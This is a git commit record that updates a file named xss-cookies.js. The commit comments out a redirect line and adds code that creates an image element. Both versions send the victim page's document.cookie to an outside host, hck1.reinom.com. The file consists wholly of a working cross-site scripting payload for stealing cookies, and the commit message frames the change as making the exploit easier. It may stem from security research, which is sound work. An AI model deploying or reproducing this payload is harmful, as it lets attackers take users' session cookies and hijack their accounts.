a860865dd36e1377261793c142b31eeea7a4d833
Xenos <dev.coding@reinom.com>
2023-11-21 19:24:48 +0100

    Update xss-cookies.js
    Using image for easier exploit

--- xss-cookies.js
+++ xss-cookies.js
@@ -1,1 +1,6 @@
-document.location = "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie;
+// document.location = "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie;
+(() => {
+  const x = new Image();
+  x.setAttribute('src', "https://hck1.reinom.com/xss-jsdelivr?cookie="+document.cookie);
+  document.body.appendChild(x);
+})();
